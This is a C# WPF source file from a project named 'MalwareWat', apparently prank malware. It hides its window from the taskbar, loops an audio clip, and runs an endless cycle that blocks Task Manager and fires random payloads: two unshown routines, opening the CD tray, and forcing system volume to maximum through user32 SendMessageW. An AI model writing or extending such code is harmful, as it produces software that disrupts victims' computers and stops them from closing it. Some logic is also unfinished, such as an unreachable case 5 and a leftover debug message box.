using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace MalwareWat
{
    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr Hwnd, int Msg, IntPtr wParam, IntPtr IParam);

        public const int APPCOMMAND_VOLUME_UP = 0xA00;
        public const int WM_APPCOMMAND = 0x319;
        public MainWindow()
        {
            Random random = new Random();
            int x = random.Next(0, 1270);
            int y = random.Next(0, 920);

            WindowStartupLocation = WindowStartupLocation.Manual;
            Left = x;
            Top = y;
            ShowInTaskbar = false;
            InitializeComponent();

            new Thread(() =>
            {
                SoundPlayer soundPlayer = new SoundPlayer(Properties.Resources.putinWalk);
                soundPlayer.PlayLooping();
            }).Start();

            RandomPayload();
        }

        public void RandomPayload()
        {
            Payload payload = new Payload();
            while (true)
            {
                Random random = new Random();
                int x = random.Next(1, 5);
                payload.BlockTaskManager();
                switch (x)
                {
                    case 1:
                        payload.Payload1();
                        break;
                    case 2:
                        payload.Payload2();
                        break;
                    case 3:
                        payload.OpenCDDVD();
                        break;
                    case 4:
                        MessageBox.Show("Case 4");
                        VOL();
                        break;
                    case 5:
                        break;
                }
                Thread.Sleep(10000);
            }
        }

        private void VOL()
        {
            for (int i = 0; i < 100; i++)
            {
                SendMessageW(new WindowInteropHelper(this).Handle, WM_APPCOMMAND, new WindowInteropHelper(this).Handle,
                    (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }
    }
}
